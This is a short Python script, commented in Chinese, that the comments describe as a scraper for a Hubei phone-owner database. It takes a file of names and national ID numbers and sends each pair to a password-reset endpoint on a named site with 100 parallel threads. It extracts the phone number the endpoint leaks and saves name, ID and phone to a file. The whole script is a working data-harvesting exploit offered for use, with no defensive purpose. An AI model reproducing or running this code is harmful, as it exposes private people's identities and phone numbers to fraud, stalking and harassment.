import concurrent.futures
import json

import requests

# 爬虫 请准备好文件 utf-8 字符
# 本脚本是用来爬取湖北机主库的
url = "https://ixy.xydatacenter.cn/sga/user/ResetPwd"


def make_request(name, id_card):
    data = {
        "stepNum": "1",
        "userName": name,
        "useridCardnum": id_card
    }
    try:
        response = requests.post(url, json=data)
        a = json.loads(response.text)
        b = a.get("respData", "空")
        return f'姓名: {name}\n身份证： {id_card}\n手机号： {b}\n'
    except Exception as e:
        return f'姓名: {name}\n身份证： {id_card}\n请求失败，错误信息： {e}\n'


input_filename = input('文件: ')

with open(input_filename, 'r', encoding='utf-8') as file:
    lines = file.readlines()

# 线程池
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    # 格式为 姓名,身份证 （,）这个可以自行更换一下
    results = list(executor.map(lambda line: make_request(*line.strip().split(',')), lines))

output_filename = 'hbhz.txt'
print(f'正在写入文件 {output_filename}...')
with open(output_filename, 'a', encoding='utf-8') as output_file:
    for result in results:
        output_file.write(result)

print(f'爬取完成。')
